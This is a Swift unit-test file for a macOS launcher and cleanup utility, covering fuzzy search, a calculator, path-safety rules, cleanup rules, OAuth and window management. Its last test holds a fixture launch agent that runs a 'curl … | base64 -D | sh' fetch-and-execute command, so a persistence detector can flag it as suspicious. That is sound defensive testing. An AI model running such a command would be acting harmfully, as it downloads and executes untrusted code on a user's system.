// SPDX-License-Identifier: MIT
import XCTest
@testable import SwoopCore

final class FuzzyMatcherTests: XCTestCase {
    func testSubsequenceRequired() {
        XCTAssertNotNil(FuzzyMatcher.match("sfr", in: "Safari"))
        XCTAssertNil(FuzzyMatcher.match("xyz", in: "Safari"))
        XCTAssertNil(FuzzyMatcher.match("ifas", in: "Safari"))
    }

    func testPrefixBeatsScattered() {
        let a = FuzzyMatcher.match("saf", in: "Safari")!.score
        let b = FuzzyMatcher.match("saf", in: "Disk Usage Analyser Free")!.score
        XCTAssertGreaterThan(a, b)
    }

    func testWordStartsAndAcronyms() {
        let vs = FuzzyMatcher.match("vsc", in: "Visual Studio Code")!
        XCTAssertEqual(vs.matchedIndices, [0, 7, 14])
        let a = FuzzyMatcher.match("sp", in: "System Preferences")!.score
        let b = FuzzyMatcher.match("sp", in: "Mission Control Shop")!.score
        XCTAssertGreaterThan(a, b)
    }

    func testCaseAndDiacriticInsensitive() {
        XCTAssertNotNil(FuzzyMatcher.match("CAFE", in: "Café Finder"))
        XCTAssertNotNil(FuzzyMatcher.match("music", in: "Music"))
    }

    func testExactBeatsLonger() {
        let exact = FuzzyMatcher.match("notes", in: "Notes")!.score
        let longer = FuzzyMatcher.match("notes", in: "Notes Helper Extension")!.score
        XCTAssertGreaterThan(exact, longer)
    }

    func testEmptyQueryMatchesEverything() {
        XCTAssertEqual(FuzzyMatcher.match("", in: "Anything")?.score, 0)
    }

    func testBestScoreAcrossFields() {
        XCTAssertNotNil(FuzzyMatcher.bestScore("dark", fields: ["Appearance", "dark mode", "accent"]))
        XCTAssertNil(FuzzyMatcher.bestScore("qqq", fields: ["Appearance"]))
    }
}

final class CalculatorTests: XCTestCase {
    func v(_ s: String) -> Double? { Calculator.evaluate(s)?.value }

    func testArithmetic() {
        XCTAssertEqual(v("2+3*4"), 14)
        XCTAssertEqual(v("(2+3)*4"), 20)
        XCTAssertEqual(v("2^10"), 1024)
        XCTAssertEqual(v("2**3"), 8)
        XCTAssertEqual(v("-3+5"), 2)
        XCTAssertEqual(v("10/4"), 2.5)
        XCTAssertEqual(v("7 % 3"), 1)
        XCTAssertEqual(v("50%"), 0.5)
        XCTAssertEqual(v("5!"), 120)
        XCTAssertEqual(v("1,000 * 2"), 2000)
        XCTAssertEqual(v("6 × 7"), 42)
        XCTAssertEqual(v("2(3+4)"), 14)
    }

    func testFunctionsAndConstants() {
        XCTAssertEqual(v("sqrt(16)"), 4)
        XCTAssertEqual(v("abs(-2)+1"), 3)
        XCTAssertEqual(v("2*pi")!, 2 * Double.pi, accuracy: 1e-12)
        XCTAssertEqual(v("log(1000)")!, 3, accuracy: 1e-12)
        XCTAssertEqual(v("round(2.6)"), 3)
    }

    func testNotACalculation() {
        XCTAssertNil(Calculator.evaluate("safari"))
        XCTAssertNil(Calculator.evaluate("42"))
        XCTAssertNil(Calculator.evaluate(""))
        XCTAssertNil(Calculator.evaluate("1/0"))
        XCTAssertNil(Calculator.evaluate("2+"))
        XCTAssertNil(Calculator.evaluate("(2+3"))
    }

    func testUnitConversions() {
        XCTAssertEqual(v("10 km to mi")!, 6.21371192, accuracy: 1e-6)
        XCTAssertEqual(v("100 c to f")!, 212, accuracy: 1e-9)
        XCTAssertEqual(v("32 f in c")!, 0, accuracy: 1e-9)
        XCTAssertEqual(v("1 gb to mb")!, 1000, accuracy: 1e-9)
        XCTAssertEqual(v("1 gib to mib")!, 1024, accuracy: 1e-9)
        XCTAssertEqual(v("5 ft in cm")!, 152.4, accuracy: 1e-9)
        XCTAssertEqual(v("2 hours to minutes")!, 120, accuracy: 1e-9)
        XCTAssertEqual(v("10kg to lb")!, 22.0462262, accuracy: 1e-6)
        XCTAssertEqual(v("3*4 m to ft")!, 39.3700787, accuracy: 1e-6)
        XCTAssertEqual(v("60 mph to km/h")!, 96.56064, accuracy: 1e-6)
        XCTAssertNil(Calculator.evaluate("10 km to kg"))
    }

    func testDisplay() {
        XCTAssertEqual(Calculator.evaluate("2+2")?.display, "4")
        XCTAssertEqual(Calculator.evaluate("1/4")?.display, "0.25")
        XCTAssertEqual(Calculator.evaluate("100 c to f")?.display, "212 °F")
    }
}

final class SnippetTests: XCTestCase {
    let date = Date(timeIntervalSince1970: 1_790_000_000)  // 2026-09-21 14:13:20 UTC

    func testPlaceholders() {
        let e = SnippetExpander.expand("Hi {clipboard}! {date:yyyy-MM-dd}", now: date, clipboard: "Ana",
                                       timeZone: TimeZone(identifier: "UTC")!)
        XCTAssertEqual(e.text, "Hi Ana! 2026-09-21")
        XCTAssertEqual(e.cursorOffsetFromEnd, 0)
    }

    func testCursor() {
        let e = SnippetExpander.expand("<b>{cursor}</b>", now: date)
        XCTAssertEqual(e.text, "<b></b>")
        XCTAssertEqual(e.cursorOffsetFromEnd, 4)
    }

    func testUnknownPlaceholderKept() {
        XCTAssertEqual(SnippetExpander.expand("{nope} {", now: date).text, "{nope} {")
        XCTAssertEqual(SnippetExpander.expand("{uuid}", uuid: { "X" }).text, "X")
    }

    func testMatcherSuffixAndBackspace() {
        let snippets = [Snippet(name: "a", keyword: ";sig", text: "S"), Snippet(name: "b", keyword: "sig", text: "T")]
        var m = SnippetMatcher()
        XCTAssertNil(m.feed(";s", snippets: snippets))
        XCTAssertNil(m.feed("x", snippets: snippets))
        XCTAssertNil(m.feed("\u{7F}", snippets: snippets))   // delete the x
        XCTAssertEqual(m.feed("i", snippets: snippets)?.name, nil)
        XCTAssertEqual(m.feed("g", snippets: snippets)?.keyword, ";sig")   // longest wins
        XCTAssertEqual(m.buffer, "")
    }

    func testMatcherResetsOnReturn() {
        let snippets = [Snippet(name: "a", keyword: "ab", text: "S")]
        var m = SnippetMatcher()
        _ = m.feed("a", snippets: snippets)
        _ = m.feed("\r", snippets: snippets)
        XCTAssertNil(m.feed("b", snippets: snippets))
    }
}

final class PathSafetyTests: XCTestCase {
    let s = PathSafety(home: "/Users/ana/")

    func testSystemDenied() {
        for p in ["/", "/System/Library/Caches/x", "/usr/local/bin/x", "/private/var/db/x", "/Library/Caches/x",
                  "/bin/ls", "/Volumes/Backup/x", "/Applications/Utilities/Terminal.app", "/System/Applications/Notes.app"] {
            XCTAssertFalse(s.check(p).isAllowed, p)
        }
    }

    func testHomeRules() {
        XCTAssertTrue(s.check("/Users/ana/Library/Caches/com.foo.bar").isAllowed)
        XCTAssertTrue(s.check("/Users/ana/Downloads/big.dmg").isAllowed)
        XCTAssertFalse(s.check("/Users/ana").isAllowed)
        XCTAssertFalse(s.check("/Users/ana/Library").isAllowed)
        XCTAssertFalse(s.check("/Users/ana/Library/Caches").isAllowed)
        XCTAssertFalse(s.check("/Users/ana/Documents").isAllowed)
        XCTAssertFalse(s.check("/Users/ana/Library/Keychains/login.keychain-db").isAllowed)
        XCTAssertFalse(s.check("/Users/ana/Library/Mobile Documents/com~apple~CloudDocs/a.txt").isAllowed)
        XCTAssertFalse(s.check("/Users/ana/.ssh/id_ed25519").isAllowed)
        XCTAssertFalse(s.check("/Users/ana/Library/Containers/com.apple.mail").isAllowed)
        XCTAssertTrue(s.check("/Users/ana/Library/Containers/com.foo.bar").isAllowed)
        XCTAssertFalse(s.check("/Users/bob/Library/Caches/x").isAllowed)
        XCTAssertFalse(s.check("relative/path").isAllowed)
    }

    func testDotDotCannotEscape() {
        XCTAssertFalse(s.check("/Users/ana/Library/Caches/../../../../System/x").isAllowed)
        XCTAssertFalse(s.check("/Users/ana/Downloads/../Library/Keychains/x").isAllowed)
    }

    func testApplications() {
        XCTAssertTrue(s.check("/Applications/Foo.app").isAllowed)
        XCTAssertTrue(s.check("/Applications/Adobe/Foo.app").isAllowed)
        XCTAssertFalse(s.check("/Applications").isAllowed)
        XCTAssertFalse(s.check("/Applications/Foo.app/Contents/MacOS/Foo").isAllowed)
        XCTAssertTrue(s.check("/Applications/Foo.app/Contents/Resources/fr.lproj").isAllowed)
        XCTAssertFalse(s.check("/Applications/Foo.app/Contents/Resources/Base.lproj").isAllowed)
        XCTAssertFalse(s.check("/Applications/Safari.app").isAllowed)
    }
}

final class JunkRulesTests: XCTestCase {
    func testGlob() {
        XCTAssertTrue(JunkRules.glob("*.crdownload", matches: "file.zip.crdownload"))
        XCTAssertTrue(JunkRules.glob("com.apple.*", matches: "com.apple.Safari"))
        XCTAssertFalse(JunkRules.glob("com.apple.*", matches: "com.google.Chrome"))
        XCTAssertTrue(JunkRules.glob("a?c", matches: "abc"))
        XCTAssertTrue(JunkRules.glob("*", matches: ""))
    }

    func testCachesExcludeAppleBrowsersAndSwoop() {
        let r = JunkRules.all.first { $0.id == "user-caches" }!
        XCTAssertTrue(r.includes(name: "com.spotify.client"))
        XCTAssertFalse(r.includes(name: "com.apple.Safari"))
        XCTAssertFalse(r.includes(name: "com.apple.bird"))
        XCTAssertFalse(r.includes(name: "Google"))       // browser rule owns it
        XCTAssertFalse(r.includes(name: "CloudKit"))
        XCTAssertFalse(r.includes(name: "com.swoopkey.swoop"))
        XCTAssertFalse(r.includes(name: ".DS_Store"))
    }

    func testBrokenDownloads() {
        let r = JunkRules.all.first { $0.id == "broken-downloads" }!
        XCTAssertTrue(r.includes(name: "movie.mp4.crdownload"))
        XCTAssertTrue(r.includes(name: "x.download"))
        XCTAssertFalse(r.includes(name: "report.pdf"))
        XCTAssertEqual(r.minAgeDays, 1)
    }

    func testDefaults() {
        let off = JunkRules.all.filter { !$0.defaultEnabled }.map(\.id).sorted()
        XCTAssertEqual(off, ["language-files", "trash", "xcode-archives"])
        XCTAssertTrue(JunkRules.all.first { $0.id == "trash" }!.alwaysPermanent)
    }

    func testClassifyAndExpand() {
        let home = "/Users/ana"
        XCTAssertEqual(JunkRules.rule(forItem: "/Users/ana/Library/Caches/com.spotify.client", home: home)?.id, "user-caches")
        XCTAssertEqual(JunkRules.rule(forItem: "/Users/ana/Library/Logs/Foo", home: home)?.id, "user-logs")
        XCTAssertNil(JunkRules.rule(forItem: "/Users/ana/Library/Caches/com.apple.Safari", home: home))
        XCTAssertEqual(JunkRules.rule(forItem: "/Applications/Foo.app/Contents/Resources/de.lproj", home: home)?.id,
                       "language-files")
        let lang = JunkRules.all.first { $0.id == "language-files" }!
        let roots = JunkRules.expandRoot(lang, home: home) { dir in dir == "/Applications" ? ["A.app", "B.app", "notes.txt"] : [] }
        XCTAssertEqual(roots, ["/Applications/A.app/Contents/Resources", "/Applications/B.app/Contents/Resources",
                               "/Applications/notes.txt/Contents/Resources"])
    }

    func testEveryRuleHasASafetyNote() {
        for r in JunkRules.all { XCTAssertFalse(SafetyNotes.note(forRule: r.id).isEmpty) }
    }

    func testLanguageFiles() {
        XCTAssertFalse(LanguageFiles.shouldRemove(lproj: "en.lproj", preferred: ["pt-PT"]))
        XCTAssertFalse(LanguageFiles.shouldRemove(lproj: "en_GB.lproj", preferred: []))
        XCTAssertFalse(LanguageFiles.shouldRemove(lproj: "pt-PT.lproj", preferred: ["pt-PT"]))
        XCTAssertFalse(LanguageFiles.shouldRemove(lproj: "Base.lproj", preferred: []))
        XCTAssertTrue(LanguageFiles.shouldRemove(lproj: "ja.lproj", preferred: ["en-GB"]))
        XCTAssertTrue(LanguageFiles.shouldRemove(lproj: "zh-Hant.lproj", preferred: ["zh-Hans"]))
        XCTAssertFalse(LanguageFiles.shouldRemove(lproj: "English.lproj", preferred: []))
    }
}

final class LeftoverTests: XCTestCase {
    let app = AppIdentity(bundleID: "com.microsoft.VSCode", name: "Visual Studio Code", executableName: "Electron")

    func testBundleIDMatches() {
        XCTAssertEqual(LeftoverMatcher.match(entryName: "com.microsoft.VSCode", app: app), .bundleID)
        XCTAssertEqual(LeftoverMatcher.match(entryName: "com.microsoft.VSCode.plist", app: app), .bundleID)
        XCTAssertEqual(LeftoverMatcher.match(entryName: "com.microsoft.VSCode.ShipIt", app: app), .bundleID)
        XCTAssertEqual(LeftoverMatcher.match(entryName: "com.microsoft.VSCode.savedState", app: app), .bundleID)
        XCTAssertEqual(LeftoverMatcher.match(entryName: "UBF8T346G9.com.microsoft.VSCode", app: app), .bundleID)
        XCTAssertEqual(LeftoverMatcher.match(entryName: "group.com.microsoft.VSCode", app: app), .bundleID)
    }

    func testNameMatchOnlyWhenDistinctive() {
        XCTAssertEqual(LeftoverMatcher.match(entryName: "Visual Studio Code", app: app), .appName)
        XCTAssertNil(LeftoverMatcher.match(entryName: "Microsoft", app: app))
        let notes = AppIdentity(bundleID: "com.foo.notes", name: "Notes")
        XCTAssertNil(LeftoverMatcher.match(entryName: "Notes", app: notes))
    }

    func testNoFalsePositives() {
        XCTAssertNil(LeftoverMatcher.match(entryName: "com.microsoft.VSCodeInsiders", app: app))
        XCTAssertNil(LeftoverMatcher.match(entryName: "com.microsoft.Word", app: app))
        XCTAssertNil(LeftoverMatcher.match(entryName: "com.apple.VSCode", app: app))
        XCTAssertNotEqual(LeftoverMatcher.match(entryName: "Electron", app: app), .bundleID)
    }

    func testBundleIDExtraction() {
        XCTAssertEqual(LeftoverMatcher.bundleID(fromEntryName: "com.foo.Bar.plist"), "com.foo.bar")
        XCTAssertEqual(LeftoverMatcher.bundleID(fromEntryName: "ABCDE12345.com.foo.bar"), "com.foo.bar")
        XCTAssertEqual(LeftoverMatcher.bundleID(fromEntryName: "group.com.foo.bar"), "com.foo.bar")
        XCTAssertNil(LeftoverMatcher.bundleID(fromEntryName: "Google"))
        XCTAssertNil(LeftoverMatcher.bundleID(fromEntryName: "foo.bar"))
        XCTAssertNil(LeftoverMatcher.bundleID(fromEntryName: "notes.txt"))
    }

    func testOrphans() {
        let installed: Set<String> = ["com.foo.bar", "org.mozilla.firefox"]
        XCTAssertTrue(LeftoverMatcher.isOrphan(entryName: "com.gone.app.plist", installed: installed))
        XCTAssertFalse(LeftoverMatcher.isOrphan(entryName: "com.foo.bar.plist", installed: installed))
        XCTAssertFalse(LeftoverMatcher.isOrphan(entryName: "com.foo.bar.helper", installed: installed))
        XCTAssertFalse(LeftoverMatcher.isOrphan(entryName: "com.apple.Safari.plist", installed: installed))
        XCTAssertFalse(LeftoverMatcher.isOrphan(entryName: "Google", installed: installed))
        XCTAssertFalse(LeftoverMatcher.isOrphan(entryName: "com.swoopkey.swoop", installed: installed))
    }
}

final class ScriptAndLinkTests: XCTestCase {
    func testParseRaycastHeader() {
        let src = """
        #!/bin/bash
        # Required parameters:
        # @raycast.schemaVersion 1
        # @raycast.title Say Hello
        # @raycast.mode compact
        # @raycast.packageName Greetings
        # @raycast.icon 👋
        # @raycast.argument1 { "type": "text", "placeholder": "Name", "optional": true }
        # @raycast.needsConfirmation true
        echo "Hello $1"
        """
        let c = ScriptCommandParser.parse(src, path: "/x/hello.sh")!
        XCTAssertEqual(c.title, "Say Hello")
        XCTAssertEqual(c.mode, .compact)
        XCTAssertEqual(c.packageName, "Greetings")
        XCTAssertEqual(c.icon, "👋")
        XCTAssertEqual(c.arguments.count, 1)
        XCTAssertEqual(c.arguments[0].placeholder, "Name")
        XCTAssertTrue(c.arguments[0].optional)
        XCTAssertTrue(c.needsConfirmation)
    }

    func testOtherCommentStylesAndRejects() {
        let py = "#!/usr/bin/env python3\n# @raycast.schemaVersion 1\n# @raycast.title Py\n"
        XCTAssertEqual(ScriptCommandParser.parse(py, path: "a.py")?.mode, .fullOutput)
        let js = "// @raycast.schemaVersion 1\n// @raycast.title JS\n// @raycast.mode silent\n"
        XCTAssertEqual(ScriptCommandParser.parse(js, path: "a.js")?.mode, .silent)
        XCTAssertNil(ScriptCommandParser.parse("# @raycast.title No schema\n", path: "a.sh"))
        XCTAssertNil(ScriptCommandParser.parse("echo '@raycast.title x'\n# @raycast.schemaVersion 1", path: "a.sh"))
        XCTAssertEqual(ScriptCommandParser.interpreter(for: py, path: "a.py"), ["/usr/bin/env", "python3"])
        XCTAssertEqual(ScriptCommandParser.interpreter(for: "echo", path: "a.rb"), ["/usr/bin/env", "ruby"])
        XCTAssertEqual(ScriptCommandParser.lastLine(of: "a\nb\n\n"), "b")
    }

    func testQuicklinks() {
        let q = Quicklink(name: "G", template: "https://www.google.com/search?q={query}")
        XCTAssertTrue(q.needsQuery)
        XCTAssertEqual(q.resolve(query: "a b&c"), "https://www.google.com/search?q=a%20b%26c")
        let r = Quicklink(name: "R", template: "https://x.com/{argument name=\"user\"}")
        XCTAssertEqual(r.resolve(query: "swoop"), "https://x.com/swoop")
        XCTAssertFalse(Quicklink(name: "H", template: "https://hark.app").needsQuery)
    }
}

final class ModelTests: XCTestCase {
    func testRankerFrequencyAndFavourites() {
        var r = UsageRanker()
        let now = Date()
        r.recordUse("a", at: now); r.recordUse("a", at: now); r.recordUse("b", at: now)
        XCTAssertGreaterThan(r.bonus(for: "a", now: now), r.bonus(for: "b", now: now))
        XCTAssertEqual(r.bonus(for: "zzz", now: now), 0)
        r.toggleFavourite("b")
        XCTAssertGreaterThan(r.bonus(for: "b", now: now), r.bonus(for: "a", now: now))
        XCTAssertEqual(r.top(1, now: now), ["b"])
        // decays
        XCTAssertLessThan(r.bonus(for: "a", now: now.addingTimeInterval(86400 * 60)), r.bonus(for: "a", now: now))
    }

    func testClipboardHistoryDedupePinPrune() {
        var h = ClipboardHistory(maxEntries: 2, retentionDays: 1)
        let now = Date()
        h.add(ClipboardEntry(kind: .text, text: "one", date: now), now: now)
        h.add(ClipboardEntry(kind: .text, text: "two", date: now), now: now)
        h.togglePin(h.entries[1].id)                 // pin "one"
        h.add(ClipboardEntry(kind: .text, text: "one", date: now), now: now)   // duplicate moves up, keeps pin
        XCTAssertEqual(h.entries.map { $0.text }, ["one", "two"])
        XCTAssertTrue(h.entries[0].pinned)
        let dropped = h.add(ClipboardEntry(kind: .text, text: "three", date: now), now: now)
        h.add(ClipboardEntry(kind: .text, text: "four", date: now), now: now)
        XCTAssertTrue(dropped.isEmpty)
        XCTAssertEqual(h.entries.filter { !$0.pinned }.count, 2)
        XCTAssertTrue(h.entries.contains { $0.text == "one" })   // pinned survives the cap
        h.prune(now: now.addingTimeInterval(86400 * 3))
        XCTAssertEqual(h.entries.map { $0.text }, ["one"])     // old unpinned gone
        XCTAssertEqual(h.search("on").count, 1)
    }

    func testClipboardPrivacy() {
        XCTAssertTrue(ClipboardPrivacy.shouldIgnore(types: ["public.utf8-plain-text", "org.nspasteboard.ConcealedType"], frontmostBundleID: nil))
        XCTAssertTrue(ClipboardPrivacy.shouldIgnore(types: ["public.utf8-plain-text"], frontmostBundleID: "com.1password.1password"))
        XCTAssertFalse(ClipboardPrivacy.shouldIgnore(types: ["public.utf8-plain-text"], frontmostBundleID: "com.apple.TextEdit"))
    }

    func testFileKindAndFilter() {
        XCTAssertEqual(FileKind.of(path: "/a/b.MOV"), .video)
        XCTAssertEqual(FileKind.of(path: "/a/b.dmg"), .diskImage)
        let f = LargeFileFilter(minBytes: 100, olderThanDays: 30, kind: .video)
        let now = Date()
        XCTAssertTrue(f.matches(path: "x.mp4", size: 200, lastUsed: now.addingTimeInterval(-86400 * 40), now: now))
        XCTAssertFalse(f.matches(path: "x.mp4", size: 200, lastUsed: now, now: now))
        XCTAssertFalse(f.matches(path: "x.zip", size: 200, lastUsed: nil, now: now))
        XCTAssertFalse(f.matches(path: "x.mp4", size: 50, lastUsed: nil, now: now))
    }

    func testDuplicates() {
        let files: [(path: String, size: Int64)] = [("a", 10), ("b", 10), ("c", 10), ("d", 5), ("e", 5)]
        let content = ["a": "x", "b": "x", "c": "y", "d": "z", "e": "w"]
        let g = DuplicateGrouper.groups(files: files) { content[$0] }
        XCTAssertEqual(g, [["a", "b"]])
    }

    func testLaunchctl() {
        let out = """
        disabled services = {
            "com.foo.agent" => disabled
            "com.bar.agent" => enabled
            "com.baz" => true
        }
        """
        let d = LaunchctlParser.disabledServices(out)
        XCTAssertEqual(d["com.foo.agent"], true)
        XCTAssertEqual(d["com.bar.agent"], false)
        XCTAssertEqual(d["com.baz"], true)
    }

    func testBytes() {
        XCTAssertEqual(Bytes.format(512), "512 B")
        XCTAssertEqual(Bytes.format(1_500_000), "1.5 MB")
        XCTAssertEqual(Bytes.format(250_000_000_000), "250 GB")
    }
}

final class WindowAndHotkeyTests: XCTestCase {
    let screen = CGRect(x: 0, y: 25, width: 1440, height: 875)

    func testLayouts() {
        let cur = CGRect(x: 100, y: 100, width: 800, height: 600)
        XCTAssertEqual(WindowLayout.leftHalf.frame(in: screen, current: cur), CGRect(x: 0, y: 25, width: 720, height: 875))
        XCTAssertEqual(WindowLayout.rightHalf.frame(in: screen, current: cur), CGRect(x: 720, y: 25, width: 720, height: 875))
        XCTAssertEqual(WindowLayout.bottomRightQuarter.frame(in: screen, current: cur).origin, CGPoint(x: 720, y: 463))
        XCTAssertEqual(WindowLayout.centerThird.frame(in: screen, current: cur).width, 480)
        XCTAssertEqual(WindowLayout.rightTwoThirds.frame(in: screen, current: cur).minX, 480)
        XCTAssertEqual(WindowLayout.maximize.frame(in: screen, current: cur), screen)
        XCTAssertEqual(WindowLayout.center.frame(in: screen, current: cur), CGRect(x: 320, y: 163, width: 800, height: 600))
        XCTAssertEqual(WindowLayout.restore.frame(in: screen, current: cur), cur)
        XCTAssertEqual(flipRect(CGRect(x: 0, y: 0, width: 100, height: 50), primaryHeight: 900),
                       CGRect(x: 0, y: 850, width: 100, height: 50))
        for l in WindowLayout.allCases { XCTAssertNotNil(l.defaultShortcut.flatMap(Shortcut.parse), l.rawValue) }
        let defaults = WindowLayout.allCases.compactMap { $0.defaultShortcut }
        XCTAssertEqual(Set(defaults).count, defaults.count, "default window shortcuts must be unique")
    }

    func testShortcutParsing() {
        let s = Shortcut.parse("Option+Space")!
        XCTAssertTrue(s.option)
        XCTAssertEqual(s.key, "space")
        XCTAssertEqual(s.keyCode, 0x31)
        XCTAssertEqual(s.text, "opt+space")
        XCTAssertEqual(s.display, "⌥Space")
        XCTAssertEqual(Shortcut.parse("ctrl+opt+left")?.display, "⌃⌥←")
        XCTAssertNil(Shortcut.parse("space"))         // needs a modifier
        XCTAssertNotNil(Shortcut.parse("f5"))
        XCTAssertNil(Shortcut.parse("cmd+nokey"))
        XCTAssertNil(Shortcut.parse("hyper+a"))
    }

    func testTriggersAndConflicts() {
        XCTAssertEqual(HotkeyTrigger.parse("double:option"), .doubleTap(.option))
        XCTAssertEqual(HotkeyTrigger.parse("cmd+space")?.text, "cmd+space")
        let cmdSpace = HotkeyTrigger.parse("cmd+space")!
        let c = HotkeyConflicts.check(cmdSpace, for: "launcher.toggle", in: [])
        XCTAssertTrue(c.first?.message.contains("Spotlight") ?? false)
        let bindings = [HotkeyBinding(id: "window.leftHalf", title: "Left Half", trigger: .parse("ctrl+opt+left"))]
        let dup = HotkeyConflicts.check(.parse("ctrl+opt+left")!, for: "command.x", in: bindings)
        XCTAssertEqual(dup.count, 1)
        XCTAssertTrue(HotkeyConflicts.check(.parse("ctrl+opt+left")!, for: "window.leftHalf", in: bindings).isEmpty)
        XCTAssertTrue(HotkeyConflicts.check(.parse("opt+space")!, for: "launcher.toggle", in: bindings).isEmpty)
        let both = bindings + [HotkeyBinding(id: "b", title: "B", trigger: .parse("ctrl+opt+left"))]
        XCTAssertEqual(HotkeyConflicts.duplicates(in: both).count, 1)
    }

    func testDoubleTap() {
        var d = DoubleTapDetector(modifier: .option, interval: 0.3)
        XCTAssertFalse(d.flagsChanged([.option], at: 0.0))
        XCTAssertFalse(d.flagsChanged([], at: 0.05))
        XCTAssertTrue(d.flagsChanged([.option], at: 0.2))
        XCTAssertFalse(d.flagsChanged([], at: 0.25))
        // too slow
        XCTAssertFalse(d.flagsChanged([.option], at: 1.0))
        XCTAssertFalse(d.flagsChanged([], at: 1.05))
        XCTAssertFalse(d.flagsChanged([.option], at: 1.6))
        XCTAssertFalse(d.flagsChanged([], at: 1.65))
        // a key typed in between (⌥-letter) cancels
        XCTAssertFalse(d.flagsChanged([.option], at: 2.0))
        d.keyPressed()
        XCTAssertFalse(d.flagsChanged([], at: 2.05))
        XCTAssertFalse(d.flagsChanged([.option], at: 2.1))
        // another modifier joining cancels
        var e = DoubleTapDetector(modifier: .option)
        _ = e.flagsChanged([.option], at: 0)
        _ = e.flagsChanged([.option, .command], at: 0.05)
        _ = e.flagsChanged([], at: 0.1)
        XCTAssertFalse(e.flagsChanged([.option], at: 0.2))
    }
}

final class CloudTests: XCTestCase {
    func testSHA256AndPKCE() {
        XCTAssertEqual(SwoopSHA256.hex(SwoopSHA256.hash(Array("abc".utf8))),
                       "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad")
        XCTAssertEqual(SwoopSHA256.hex(SwoopSHA256.hash([])),
                       "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
        // cross-checked with Python: base64url(sha256(v)) without padding
        XCTAssertEqual(PKCE.challenge(for: "dBjftJeZ4CVP-mB92K9uhvD9sKe6dMQd7y4OKy6f8HQ"),
                       "qgC0Hdb0W-8E6an9re5NEiKx_gCSXliV76JihPsClPE")
        let v = PKCE.makeVerifier()
        XCTAssertEqual(v.count, 64)
        XCTAssertTrue(v.allSatisfy { $0.isLetter || $0.isNumber || "-._~".contains($0) })
    }

    func testAuthURLAndRedirect() {
        let c = OAuthConfig.googleDrive(clientID: "cid.apps.googleusercontent.com", clientSecret: nil)
        let u = OAuthFlow.authorizationURL(c, redirectURI: "http://127.0.0.1:5000", state: "st", challenge: "ch")!
        let items = URLComponents(url: u, resolvingAgainstBaseURL: false)!.queryItems!
        XCTAssertEqual(items.first { $0.name == "code_challenge_method" }?.value, "S256")
        XCTAssertEqual(items.first { $0.name == "client_id" }?.value, "cid.apps.googleusercontent.com")
        XCTAssertEqual(OAuthFlow.parseRedirect(requestLine: "GET /?state=st&code=4%2Fabc HTTP/1.1", expectedState: "st"),
                       .success("4/abc"))
        XCTAssertEqual(OAuthFlow.parseRedirect(requestLine: "GET /?state=bad&code=x HTTP/1.1", expectedState: "st"),
                       .failure(.stateMismatch))
        XCTAssertEqual(OAuthFlow.parseRedirect(requestLine: "GET /?error=access_denied&state=st HTTP/1.1", expectedState: "st"),
                       .failure(.denied("access_denied")))
        let body = String(data: OAuthFlow.tokenRequestBody(c, code: "4/a b", verifier: "v", redirectURI: "http://127.0.0.1:1"),
                          encoding: .utf8)!
        XCTAssertTrue(body.contains("code=4%2Fa%20b"))
        XCTAssertFalse(body.contains("client_secret"))
    }

    func testTokenParse() {
        let now = Date(timeIntervalSince1970: 0)
        let t = OAuthToken.parse(#"{"access_token":"A","expires_in":3599,"refresh_token":"R"}"#.data(using: .utf8)!, now: now)!
        XCTAssertEqual(t.refreshToken, "R")
        XCTAssertFalse(t.isExpired(now: now))
        XCTAssertTrue(t.isExpired(now: now.addingTimeInterval(3550)))
        let r = OAuthToken.parse(#"{"access_token":"B","expires_in":3600}"#.data(using: .utf8)!, now: now, previousRefresh: "R")!
        XCTAssertEqual(r.refreshToken, "R")
    }

    func testDriveParsing() {
        let json = #"{"files":[{"id":"1","name":"Report.pdf","mimeType":"application/pdf","size":"2048","quotaBytesUsed":"2048","modifiedTime":"2026-10-01T10:00:00.000Z","webViewLink":"https://drive.google.com/file/d/1/view"},{"id":"2","name":"Doc"}]}"#
        let files = GoogleDriveAPI.parseFiles(json.data(using: .utf8)!)
        XCTAssertEqual(files.count, 2)
        XCTAssertEqual(files[0].size, 2048)
        XCTAssertNotNil(files[0].modified)
        XCTAssertEqual(files[1].webURL, "https://drive.google.com/open?id=2")
        let about = #"{"storageQuota":{"limit":"16106127360","usage":"8053063680","usageInDriveTrash":"100"},"user":{"emailAddress":"a@b.c"}}"#
        let (u, who) = GoogleDriveAPI.parseUsage(about.data(using: .utf8)!)!
        XCTAssertEqual(u.fraction!, 0.5, accuracy: 1e-9)
        XCTAssertEqual(who, "a@b.c")
        XCTAssertTrue(GoogleDriveAPI.searchURL(query: "it's")!.absoluteString.contains("it%5C's"))
        let body = GoogleDriveAPI.multipartBody(name: "a.txt", mimeType: "text/plain", data: Data("hi".utf8), boundary: "B")
        XCTAssertTrue(String(data: body, encoding: .utf8)!.hasSuffix("hi\r\n--B--\r\n"))
    }
}

final class InsightTests: XCTestCase {
    func testTreemapCoversAreaWithoutOverlap() {
        let rect = CGRect(x: 0, y: 0, width: 600, height: 400)
        let values: [Double] = [6, 6, 4, 3, 2, 2, 1, 0]
        let tiles = Treemap.layout(values, in: rect)
        XCTAssertEqual(tiles.count, 7)
        let area = tiles.reduce(0.0) { $0 + Double($1.rect.width * $1.rect.height) }
        XCTAssertEqual(area, 240_000, accuracy: 1)
        for (i, a) in tiles.enumerated() {
            XCTAssertTrue(rect.insetBy(dx: -0.01, dy: -0.01).contains(a.rect), "\(a.rect)")
            for b in tiles[(i + 1)...] {
                let inter = a.rect.intersection(b.rect)
                XCTAssertTrue(inter.isNull || inter.width * inter.height < 0.01)
            }
        }
        // proportional
        let t0 = tiles.first { $0.index == 0 }!.rect, t6 = tiles.first { $0.index == 6 }!.rect
        XCTAssertEqual(Double(t0.width * t0.height) / Double(t6.width * t6.height), 6, accuracy: 0.01)
    }

    func testPersistenceAnalyzer() {
        let good = PersistenceItem(path: "/Users/a/Library/LaunchAgents/com.google.keystone.agent.plist",
                                   label: "com.google.keystone.agent", program: "/Users/a/Library/Google/x",
                                   signedBy: "Google LLC")
        XCTAssertEqual(PersistenceAnalyzer.analyze(good).severity, .info)
        let bad = PersistenceItem(path: "/Library/LaunchAgents/com.pcv.hlpramc.plist", label: "com.pcv.hlpramc",
                                  program: "/bin/sh", arguments: ["/bin/sh", "-c", "curl -s http://x | base64 -D | sh"])
        let f = PersistenceAnalyzer.analyze(bad)
        XCTAssertEqual(f.severity, .suspicious)
        XCTAssertFalse(f.reasons.isEmpty)
